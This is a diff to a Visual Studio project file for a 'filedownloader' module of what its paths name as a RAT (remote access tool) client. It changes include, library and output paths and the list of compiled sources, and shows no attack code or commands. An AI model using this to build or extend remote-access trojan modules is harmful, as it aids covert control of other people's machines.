@@ -41,15 +41,17 @@
   <PropertyGroup Label="UserMacros" />
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
     <LinkIncremental>true</LinkIncremental>
-    <IncludePath>D:\RAT\Client\Kernel\Common;$(IncludePath)</IncludePath>
-    <SourcePath>D:\RAT\Client\Kernel\Common;$(SourcePath)</SourcePath>
+    <IncludePath>..\Common;$(IncludePath)</IncludePath>
+    <SourcePath>..\Common;$(SourcePath)</SourcePath>
+    <LibraryPath>$(VC_LibraryPath_x86);$(WindowsSDK_LibraryPath_x86);..\Common;</LibraryPath>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
     <LinkIncremental>false</LinkIncremental>
-    <IncludePath>D:\RAT\Client\Kernel\Common;$(IncludePath)</IncludePath>
-    <SourcePath>D:\RAT\Client\Kernel\Common;$(SourcePath)</SourcePath>
-    <OutDir>..\..\..\HoldingHands\release\modules</OutDir>
+    <IncludePath>..\Common;$(IncludePath)</IncludePath>
+    <SourcePath>..\Common;$(SourcePath)</SourcePath>
+    <OutDir>..\..\..\server\modules</OutDir>
     <TargetName>filedownloader</TargetName>
+    <LibraryPath>$(VC_LibraryPath_x86);$(WindowsSDK_LibraryPath_x86);..\Common</LibraryPath>
   </PropertyGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
     <ClCompile>
@@ -63,6 +65,7 @@
     <Link>
       <SubSystem>Windows</SubSystem>
       <GenerateDebugInformation>true</GenerateDebugInformation>
+      <IgnoreSpecificDefaultLibraries>libcmt.lib</IgnoreSpecificDefaultLibraries>
     </Link>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
@@ -84,9 +87,11 @@
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
-    <ClCompile Include="..\Common\EventHandler.cpp" />
     <ClCompile Include="..\Common\IOCPClient.cpp" />
+    <ClCompile Include="..\Common\Manager.cpp" />
+    <ClCompile Include="..\Common\MsgHandler.cpp" />
     <ClCompile Include="..\Common\Packet.cpp" />
+    <ClCompile Include="..\Common\utils.cpp" />
     <ClCompile Include="..\FileManager\FileDownloader.cpp" />
     <ClCompile Include="main.cpp" />
   </ItemGroup>
